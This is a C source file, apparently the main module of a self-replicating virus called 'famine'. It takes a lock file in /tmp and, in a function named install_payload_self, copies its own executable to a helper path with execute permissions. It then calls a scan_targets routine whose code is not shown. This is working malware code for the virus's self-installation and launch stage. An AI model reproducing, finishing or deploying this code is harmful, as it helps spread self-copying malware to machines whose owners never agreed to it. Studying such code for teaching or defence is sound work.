#include "famine.h"

#include <sys/file.h>
#include <limits.h>
#include <string.h>
#include <sys/stat.h>

static int	g_lock_fd = -1;

static int	copy_binary(const char *src, const char *dst)
{
	char	buffer[4096];
	int		src_fd;
	int		dst_fd;
	ssize_t	readed;
	ssize_t	written_total;
	ssize_t	written;

	src_fd = open(src, O_RDONLY);
	if (src_fd < 0)
		return (0);
	dst_fd = open(dst, O_WRONLY | O_CREAT | O_TRUNC, 0755);
	if (dst_fd < 0)
	{
		close(src_fd);
		return (0);
	}
	while (1)
	{
		readed = read(src_fd, buffer, sizeof(buffer));
		if (readed < 0)
		{
			close(src_fd);
			close(dst_fd);
			return (0);
		}
		if (readed == 0)
			break ;
		written_total = 0;
		while (written_total < readed)
		{
			written = write(dst_fd, buffer + written_total, (size_t)(readed - written_total));
			if (written <= 0)
			{
				close(src_fd);
				close(dst_fd);
				return (0);
			}
			written_total += written;
		}
	}
	if (fchmod(dst_fd, 0755) < 0)
	{
		close(src_fd);
		close(dst_fd);
		return (0);
	}
	close(src_fd);
	close(dst_fd);
	return (1);
}

static int	install_payload_self(void)
{
	char		current_path[PATH_MAX];
	ssize_t		len;

	len = readlink("/proc/self/exe", current_path, sizeof(current_path) - 1);
	if (len <= 0)
		return (0);
	current_path[len] = '\0';
	if (strncmp(current_path, FAMINE_HELPER_PATH, PATH_MAX) == 0)
		return (1);
	return (copy_binary(current_path, FAMINE_HELPER_PATH));
}

static int acquire_lock(void)
{
	g_lock_fd = open("/tmp/famine.run.lock", O_CREAT | O_RDWR, 0600);
	if (g_lock_fd == -1)
		return (-1);
	if (flock(g_lock_fd, LOCK_EX | LOCK_NB) == -1)
	{
		close(g_lock_fd);
		g_lock_fd = -1;
		return (0);
	}
	return (1);
}

static void release_lock(void)
{
	if (g_lock_fd != -1)
	{
		flock(g_lock_fd, LOCK_UN);
		close(g_lock_fd);
		g_lock_fd = -1;
	}
	unlink("/tmp/famine.run.lock");
}

int main(void)
{
	int	lock_status;

	lock_status = acquire_lock();
	if (lock_status <= 0)
		return (0);
	install_payload_self();
	atexit(release_lock);
	scan_targets();
	return (0);
}
